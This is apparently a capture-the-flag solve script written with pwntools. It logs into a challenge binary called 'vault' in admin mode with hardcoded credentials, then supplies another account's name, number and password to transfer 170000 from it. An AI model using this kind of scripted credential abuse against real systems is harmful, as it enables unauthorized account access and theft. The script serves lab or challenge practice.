#!/usr/bin/env python3
# exploit.py
# Requires: pwntools (pip install pwntools)

from pwn import *
import sys

context.log_level = "info"
# adjust timeout if binary is slow
TIMEOUT = 3

def start():
    # allow `python3 exploit.py REMOTE=host:port` usage
    if args.REMOTE:
        host, port = args.REMOTE.split(":")
        return remote(host, int(port), timeout=TIMEOUT)
    else:
        # local binary with argument -admin
        return process(["./vault", "-admin"], timeout=TIMEOUT)

def main():
    p = start()

    try:
        # initial handshake
        p.recvuntil(b"Enter Access Token:", timeout=TIMEOUT)
        p.sendline(b"aerys")

        p.recvuntil(b"Enter Password:", timeout=TIMEOUT)
        p.sendline(b"hacker321")

        # menu
        p.recvuntil(b"Select option:", timeout=TIMEOUT)
        # choose Make a Transaction -> option 3
        p.sendline(b"3")

        # now the transfer form prompts
        # Some prompts may include extra text or newlines; be permissive
        p.recvuntil(b"Your Balance:", timeout=TIMEOUT)  # wait for balance line to appear

        # Target Account Name:
        p.recvuntil(b"Target Account Name:", timeout=TIMEOUT)
        p.sendline(b"fang")

        # Target Account Number:
        p.recvuntil(b"Target Account Number:", timeout=TIMEOUT)
        p.sendline(b"ELIT3V3R592471-badc0ffeee")

        # Target Account Password:
        p.recvuntil(b"Target Account Password:", timeout=TIMEOUT)
        p.sendline(b"fangi_is_number1")

        # Transfer Amount:
        p.recvuntil(b"Transfer Amount:", timeout=TIMEOUT)
        p.sendline(b"170000")

        # Fail safe verification prompt
        p.recvuntil(b"Just to be safe, enter your account number:", timeout=TIMEOUT)
        p.sendline(b"USER-37198")

        # capture and show final output; hand over to interactive so you can see any response
        log.info("Sent all fields. Dropping to interactive so you can observe the result.")
        p.interactive()

    except EOFError:
        log.error("Connection closed by target.")
        try:
            print(p.recv(timeout=1).decode(errors="ignore"))
        except Exception:
            pass
    except Exception as e:
        log.error(f"Unexpected error: {e}")
        try:
            print(p.recv(timeout=1).decode(errors="ignore"))
        except Exception:
            pass
    finally:
        try:
            p.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()
